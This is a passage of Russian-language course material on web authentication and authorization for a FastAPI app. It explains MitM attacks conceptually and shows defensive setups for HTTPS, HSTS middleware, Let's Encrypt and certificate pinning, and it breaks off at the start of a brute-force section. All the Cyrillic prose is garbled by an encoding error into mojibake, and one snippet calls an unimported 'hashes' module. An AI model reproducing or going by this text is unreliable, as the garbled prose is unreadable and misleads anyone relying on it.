# **–ù–µ–¥–µ–ª—è 11-12: –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è**

## –û–≥–ª–∞–≤–ª–µ–Ω–∏–µ

1. [–¢–µ–æ—Ä–µ—Ç–∏—á–µ—Å–∫–∞—è —á–∞—Å—Ç—å](#—Ç–µ–æ—Ä–µ—Ç–∏—á–µ—Å–∫–∞—è-—á–∞—Å—Ç—å)
   - –û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–Ω—Ü–µ–ø—Ü–∏–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
   - JWT (JSON Web Tokens)
   - OAuth 2.0 –∏ –µ–≥–æ –ø–æ—Ç–æ–∫–∏
   - –•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π
2. [–ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∞—è —á–∞—Å—Ç—å](#–ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∞—è-—á–∞—Å—Ç—å)
   - –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
   - –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
   - –ú–æ–¥–µ–ª–∏ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
   - Pydantic –º–æ–¥–µ–ª–∏ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
   - –°–µ—Ä–≤–∏—Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
   - –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
   - Endpoints –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
   - Endpoints —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏
   - –ü—Ä–∏–º–µ—Ä –∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ endpoint
3. [–ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è API](#–ø—Ä–∏–º–µ—Ä—ã-–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è-api)
4. [–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏](#—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏)
5. [–ß–∞—Å—Ç—ã–µ –æ—à–∏–±–∫–∏ –∏ —Ä–µ—à–µ–Ω–∏—è](#—á–∞—Å—Ç—ã–µ-–æ—à–∏–±–∫–∏-–∏-—Ä–µ—à–µ–Ω–∏—è)
6. [–ú–∏–≥—Ä–∞—Ü–∏–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö](#–º–∏–≥—Ä–∞—Ü–∏–∏-–±–∞–∑—ã-–¥–∞–Ω–Ω—ã—Ö)
7. [–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –¥–ª—è production](#—Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏-–¥–ª—è-production)
8. [–ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–æ–µ –∑–∞–¥–∞–Ω–∏–µ –Ω–∞ –Ω–µ–¥–µ–ª–∏ 11-12](#–ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–æ–µ-–∑–∞–¥–∞–Ω–∏–µ-–Ω–∞-–Ω–µ–¥–µ–ª–∏-11-12)

---

## **üìö –¢–µ–æ—Ä–µ—Ç–∏—á–µ—Å–∫–∞—è —á–∞—Å—Ç—å**

### **1. –û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–Ω—Ü–µ–ø—Ü–∏–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π**

**–ó–∞—á–µ–º –Ω—É–∂–Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å:**
- –ó–∞—â–∏—Ç–∞ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
- –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏–µ –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞
- –°–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º (GDPR, PCI-DSS)
- –î–æ–≤–µ—Ä–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
- –ó–∞—â–∏—Ç–∞ –±–∏–∑–Ω–µ—Å-–ª–æ–≥–∏–∫–∏

**–ê–Ω–∞–ª–æ–≥–∏—è:** –ü—Ä–µ–¥—Å—Ç–∞–≤—å—Ç–µ –±–∞–Ω–∫:
- **–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è** ‚Äî –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Å–ø–æ—Ä—Ç–∞ (–∫—Ç–æ –≤—ã?)
- **–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è** ‚Äî –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–µ–π—Ñ—É (—á—Ç–æ –≤–∞–º —Ä–∞–∑—Ä–µ—à–µ–Ω–æ?)

#### **–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è vs –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è:**
- **–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è (Authentication)** - "–ö—Ç–æ –≤—ã?" - –ø—Ä–æ–≤–µ—Ä–∫–∞ –ª–∏—á–Ω–æ—Å—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
  - –ü—Ä–æ–≤–µ—Ä–∫–∞ –ª–æ–≥–∏–Ω–∞/–ø–∞—Ä–æ–ª—è
  - –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞
  - –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∏–æ–º–µ—Ç—Ä–∏–∏
  
- **–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è (Authorization)** - "–ß—Ç–æ –≤–∞–º —Ä–∞–∑—Ä–µ—à–µ–Ω–æ?" - –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞
  - –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–æ–ª–µ–π
  - –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π (permissions)
  - –ü—Ä–æ–≤–µ—Ä–∫–∞ scopes

#### **–ú–µ—Ç–æ–¥—ã –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏:**
1. **–ë–∞–∑–æ–≤–∞—è (Basic Auth)** - –ª–æ–≥–∏–Ω/–ø–∞—Ä–æ–ª—å –≤ –∑–∞–≥–æ–ª–æ–≤–∫–∞—Ö
2. **–°–µ—Å—Å–∏–∏ (Sessions)** - —Å–æ—Å—Ç–æ—è–Ω–∏–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
3. **–¢–æ–∫–µ–Ω—ã (Tokens)** - JWT, OAuth2 —Ç–æ–∫–µ–Ω—ã
4. **API –∫–ª—é—á–∏** - —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–µ –∫–ª—é—á–∏
5. **OAuth 2.0 / OpenID Connect** - –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è

#### **–û—Å–Ω–æ–≤–Ω—ã–µ —É–≥—Ä–æ–∑—ã –∏ –∑–∞—â–∏—Ç–∞:**

#### **1. –ü–µ—Ä–µ—Ö–≤–∞—Ç –ø–∞—Ä–æ–ª–µ–π (MitM - Man-in-the-Middle) - –ê—Ç–∞–∫–∞ "—á–µ–ª–æ–≤–µ–∫ –ø–æ—Å–µ—Ä–µ–¥–∏–Ω–µ"**

**–ß—Ç–æ —ç—Ç–æ:**
MitM –∞—Ç–∞–∫–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç, –∫–æ–≥–¥–∞ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç –∏ —á–∏—Ç–∞–µ—Ç (–∏–ª–∏ –¥–∞–∂–µ –∏–∑–º–µ–Ω—è–µ—Ç) –¥–∞–Ω–Ω—ã–µ, –ø–µ—Ä–µ–¥–∞–≤–∞–µ–º—ã–µ –º–µ–∂–¥—É –¥–≤—É–º—è —Å—Ç–æ—Ä–æ–Ω–∞–º–∏, –∫–æ—Ç–æ—Ä—ã–µ —Å—á–∏—Ç–∞—é—Ç, —á—Ç–æ –æ–±—â–∞—é—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é –¥—Ä—É–≥ —Å –¥—Ä—É–≥–æ–º.

**–ê–Ω–∞–ª–æ–≥–∏—è:**
–ü—Ä–µ–¥—Å—Ç–∞–≤—å—Ç–µ, —á—Ç–æ –≤—ã –ø–∏—à–µ—Ç–µ –ø–∏—Å—å–º–æ –¥—Ä—É–≥—É –∏ –ø–µ—Ä–µ–¥–∞–µ—Ç–µ –µ–≥–æ —á–µ—Ä–µ–∑ –ø–æ—á—Ç–∞–ª—å–æ–Ω–∞. –ù–æ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç –ø–∏—Å—å–º–æ, —á–∏—Ç–∞–µ—Ç –µ–≥–æ, –º–æ–∂–µ—Ç –¥–∞–∂–µ –∏–∑–º–µ–Ω–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ, –∞ –∑–∞—Ç–µ–º –ø–µ—Ä–µ–¥–∞–µ—Ç –¥–∞–ª—å—à–µ. –ò –≤—ã, –∏ –≤–∞—à –¥—Ä—É–≥ –¥—É–º–∞–µ—Ç–µ, —á—Ç–æ –ø–∏—Å—å–º–æ —à–ª–æ –Ω–∞–ø—Ä—è–º—É—é, –Ω–æ –Ω–∞ —Å–∞–º–æ–º –¥–µ–ª–µ –µ–≥–æ —á–∏—Ç–∞–ª –ø–æ—Å—Ç–æ—Ä–æ–Ω–Ω–∏–π.

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç (–ø—Ä–∏–º–µ—Ä –∞—Ç–∞–∫–∏):**

1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è –∫ –ø—É–±–ª–∏—á–Ω–æ–π Wi-Fi —Å–µ—Ç–∏ (–∫–∞—Ñ–µ, –∞—ç—Ä–æ–ø–æ—Ä—Ç)
2. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —Å–æ–∑–¥–∞–µ—Ç –ø–æ–¥–¥–µ–ª—å–Ω—É—é —Ç–æ—á–∫—É –¥–æ—Å—Ç—É–ø–∞ —Å –ø–æ—Ö–æ–∂–∏–º –Ω–∞–∑–≤–∞–Ω–∏–µ–º (–Ω–∞–ø—Ä–∏–º–µ—Ä, "Free_WiFi" –≤–º–µ—Å—Ç–æ "Free_WiFi_Official")
3. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è –∫ –ø–æ–¥–¥–µ–ª—å–Ω–æ–π —Å–µ—Ç–∏
4. –í–µ—Å—å —Ç—Ä–∞—Ñ–∏–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø—Ä–æ—Ö–æ–¥–∏—Ç —á–µ—Ä–µ–∑ –∫–æ–º–ø—å—é—Ç–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞
5. –ï—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è HTTP (–Ω–µ HTTPS), –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–∏–¥–∏—Ç:
   - –õ–æ–≥–∏–Ω—ã –∏ –ø–∞—Ä–æ–ª–∏
   - –ù–æ–º–µ—Ä–∞ –±–∞–Ω–∫–æ–≤—Å–∫–∏—Ö –∫–∞—Ä—Ç
   - –õ–∏—á–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è
   - –¢–æ–∫–µ–Ω—ã –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
6. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –¥–∞–∂–µ –∏–∑–º–µ–Ω—è—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π –Ω–∞ —Å–µ—Ä–≤–µ—Ä

**–ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è:**

**1. HTTPS –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω - —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –≤—Å–µ–≥–æ —Ç—Ä–∞—Ñ–∏–∫–∞**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- HTTPS –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø—Ä–æ—Ç–æ–∫–æ–ª TLS/SSL –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
- –î–∞–∂–µ –µ—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç —Ç—Ä–∞—Ñ–∏–∫, –æ–Ω —É–≤–∏–¥–∏—Ç —Ç–æ–ª—å–∫–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
- –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å –∏—Ö –±–µ–∑ —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ

**–ê–Ω–∞–ª–æ–≥–∏—è:** –≠—Ç–æ –∫–∞–∫ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –ø–∏—Å—å–º–æ –≤ —Å–µ–π—Ñ–µ. –î–∞–∂–µ –µ—Å–ª–∏ –µ–≥–æ –ø–µ—Ä–µ—Ö–≤–∞—Ç—è—Ç, –Ω–µ —Å–º–æ–≥—É—Ç –ø—Ä–æ—á–∏—Ç–∞—Ç—å –±–µ–∑ –∫–ª—é—á–∞.

**–ü—Ä–∏–º–µ—Ä –Ω–∞—Å—Ç—Ä–æ–π–∫–∏:**
```python
# –í production –ù–ò–ö–û–ì–î–ê –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ HTTP
# –í—Å–µ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ HTTPS —á–µ—Ä–µ–∑ reverse proxy

# –í–∞—Ä–∏–∞–Ω—Ç 1: –ß–µ—Ä–µ–∑ Nginx (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è)
# nginx.conf:
# server {
#     listen 443 ssl;
#     server_name yourdomain.com;
#     ssl_certificate /path/to/cert.pem;
#     ssl_certificate_key /path/to/key.pem;
#     location / {
#         proxy_pass http://127.0.0.1:8000;
#     }
# }

# –í–∞—Ä–∏–∞–Ω—Ç 2: –ù–∞–ø—Ä—è–º—É—é –≤ uvicorn (—Ç–æ–ª—å–∫–æ –¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏/—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è)
# uvicorn app.main:app --ssl-keyfile key.pem --ssl-certfile cert.pem --host 0.0.0.0 --port 443

# –í–∞—Ä–∏–∞–Ω—Ç 3: –ß–µ—Ä–µ–∑ Docker —Å Traefik (—Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π –ø–æ–¥—Ö–æ–¥)
# Traefik –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —É–ø—Ä–∞–≤–ª—è–µ—Ç SSL —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞–º–∏ —á–µ—Ä–µ–∑ Let's Encrypt
```

**2. HSTS (HTTP Strict Transport Security)**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –°–µ—Ä–≤–µ—Ä —Å–æ–æ–±—â–∞–µ—Ç –±—Ä–∞—É–∑–µ—Ä—É: "–í—Å–µ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–π HTTPS –¥–ª—è —ç—Ç–æ–≥–æ —Å–∞–π—Ç–∞"
- –ë—Ä–∞—É–∑–µ—Ä –∑–∞–ø–æ–º–∏–Ω–∞–µ—Ç —ç—Ç–æ –∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–µ—Ä–µ–∫–ª—é—á–∞–µ—Ç—Å—è –Ω–∞ HTTPS
- –î–∞–∂–µ –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–¥–µ—Ç `http://`, –±—Ä–∞—É–∑–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç `https://`
- –ó–∞—â–∏—â–∞–µ—Ç –æ—Ç –∞—Ç–∞–∫, –∫–æ–≥–¥–∞ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø—ã—Ç–∞–µ—Ç—Å—è –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç—å –Ω–∞ HTTP

**–ü—Ä–∏–º–µ—Ä –Ω–∞—Å—Ç—Ä–æ–π–∫–∏:**
```python
from fastapi import FastAPI, Response
from starlette.middleware.base import BaseHTTPMiddleware

class HSTSMiddleware(BaseHTTPMiddleware):
    """Middleware –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è HSTS –∑–∞–≥–æ–ª–æ–≤–∫–∞"""
    
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        
        # –î–æ–±–∞–≤–ª—è–µ–º HSTS –∑–∞–≥–æ–ª–æ–≤–æ–∫ —Ç–æ–ª—å–∫–æ –¥–ª—è HTTPS
        if request.url.scheme == "https":
            # max-age –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (31536000 = 1 –≥–æ–¥)
            # includeSubDomains - –ø—Ä–∏–º–µ–Ω—è–µ—Ç—Å—è –∫–æ –≤—Å–µ–º –ø–æ–¥–¥–æ–º–µ–Ω–∞–º
            # preload - –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –≤ —Å–ø–∏—Å–æ–∫ –ø—Ä–µ–¥–∑–∞–≥—Ä—É–∑–∫–∏ –±—Ä–∞—É–∑–µ—Ä–æ–≤
            response.headers["Strict-Transport-Security"] = (
                "max-age=31536000; includeSubDomains; preload"
            )
        
        return response

app.add_middleware(HSTSMiddleware)
```

**3. –°–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç—ã SSL/TLS**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –°–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ –≤—ã –æ–±—â–∞–µ—Ç–µ—Å—å —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º —Å–µ—Ä–≤–µ—Ä–æ–º
- –í—ã–¥–∞–µ—Ç—Å—è –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã–º —Ü–µ–Ω—Ç—Ä–æ–º —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ (CA)
- –ë—Ä–∞—É–∑–µ—Ä –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –ø–µ—Ä–µ–¥ —É—Å—Ç–∞–Ω–æ–≤–∫–æ–π —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
- –ï—Å–ª–∏ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω - –±—Ä–∞—É–∑–µ—Ä –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

**–ê–Ω–∞–ª–æ–≥–∏—è:** –≠—Ç–æ –∫–∞–∫ –ø–∞—Å–ø–æ—Ä—Ç. –í—ã –ø—Ä–æ–≤–µ—Ä—è–µ—Ç–µ –ø–∞—Å–ø–æ—Ä—Ç, —á—Ç–æ–±—ã —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –æ–±—â–∞–µ—Ç–µ—Å—å —Å —Ç–µ–º —á–µ–ª–æ–≤–µ–∫–æ–º, –∑–∞ –∫–æ—Ç–æ—Ä–æ–≥–æ –æ–Ω —Å–µ–±—è –≤—ã–¥–∞–µ—Ç.

**–ü–æ–ª—É—á–µ–Ω–∏–µ –±–µ—Å–ø–ª–∞—Ç–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞:**
```bash
# –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ Let's Encrypt –¥–ª—è –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö SSL —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–≤
# –ß–µ—Ä–µ–∑ certbot:
sudo certbot certonly --standalone -d yourdomain.com

# –ò–ª–∏ —á–µ—Ä–µ–∑ Docker —Å Traefik (–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ)
```

**4. Certificate Pinning (–¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π)**

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:**
- –ú–æ–±–∏–ª—å–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ "–∑–∞–ø–æ–º–∏–Ω–∞–µ—Ç" —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç —Å–µ—Ä–≤–µ—Ä–∞
- –ü—Ä–∏ –∫–∞–∂–¥–æ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, —á—Ç–æ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç —Å–æ–≤–ø–∞–¥–∞–µ—Ç
- –î–∞–∂–µ –µ—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–ª—É—á–∏—Ç –≤–∞–ª–∏–¥–Ω—ã–π —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –æ—Ç –¥—Ä—É–≥–æ–≥–æ CA, –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –µ–≥–æ –Ω–µ –ø—Ä–∏–º–µ—Ç

**–ü—Ä–∏–º–µ—Ä –¥–ª—è Android:**
```kotlin
// Network Security Config
val certificatePinner = CertificatePinner.Builder()
    .add("yourdomain.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .build()

val client = OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build()
```

**–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –º–µ—Ä—ã –∑–∞—â–∏—Ç—ã:**
```python
# –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞ –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ
import ssl
import certifi

# –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ certifi –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–≤
ssl_context = ssl.create_default_context(cafile=certifi.where())

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–ø–µ—á–∞—Ç–∫–∞ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞
def verify_certificate(cert, hostname):
    # –°—Ä–∞–≤–Ω–µ–Ω–∏–µ –æ—Ç–ø–µ—á–∞—Ç–∫–∞ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞ —Å –æ–∂–∏–¥–∞–µ–º—ã–º
    expected_fingerprint = "your_expected_fingerprint"
    actual_fingerprint = cert.fingerprint(hashes.SHA256())
    return actual_fingerprint == expected_fingerprint
```

#### **2. –ë—Ä—É—Ç—Ñ–æ—Ä—Å (Brute Force) - –ê—Ç–∞–∫–∞ –ø–µ—Ä–µ–±–æ—Ä–æ–º**

**–ß—Ç–æ —ç—Ç–æ:**
–ë—Ä—É—Ç—Ñ–æ—Ä—Å –∞—Ç–∞–∫–∞ - —ç—Ç–æ –º–µ—Ç–æ–¥ –≤–∑–ª–æ–º–∞, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–º –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —Å–∏—Å—Ç–µ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–æ–±—É–µ—Ç –≤—Å–µ –≤–æ–∑–º–æ–∂–Ω—ã–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ –ø–∞—Ä–æ–ª–µ–π –∏–ª–∏ —Ç–æ–∫–µ–Ω–æ–≤ –¥–æ —Ç–µ—Ö –ø–æ—Ä, –ø–æ–∫–∞ –Ω–µ –Ω–∞–π–¥–µ—Ç –ø—Ä–∞–≤–∏–ª—å–Ω—É—é.

**–ê–Ω–∞–ª–æ–≥–∏—è:**
–≠—Ç–æ –∫–∞–∫ –≤–æ—Ä, –∫–æ—Ç–æ—Ä—ã–π –ø—ã—Ç–∞–µ—Ç—Å—è –æ—Ç–∫—Ä—ã—Ç—å –∑–∞–º–æ–∫, –ø—Ä–æ–±—É—è –≤—Å–µ –≤–æ–∑–º–æ–∂–Ω—ã–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ —Ü–∏—Ñ—Ä. –ï—Å–ª–∏ –∑–∞–º–æ–∫ –ø—Ä–æ—Å—Ç–æ–π (–∫–æ—Ä–æ—Ç–∫–∏–π –ø–∞—Ä–æ–ª—å), —Ä–∞–Ω–æ –∏–ª–∏ –ø–æ–∑–¥–Ω–æ –æ–Ω –µ–≥–æ –æ—Ç–∫—Ä–æ–µ—Ç. –ï—Å–ª–∏ –∑–∞–º–æ–∫ —Å–ª–æ–∂–Ω—ã–π (–¥–ª–∏–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å) –∏ –µ—Å—Ç—å –∑–∞—â–∏—Ç–∞ (–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø–æ—Å–ª–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø–æ–ø—ã—Ç–æ–∫), –≤–æ—Ä –Ω–µ —É—Å–ø–µ–µ—Ç.

**–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç (–ø—Ä–∏–º–µ—Ä –∞—Ç–∞–∫–∏):**

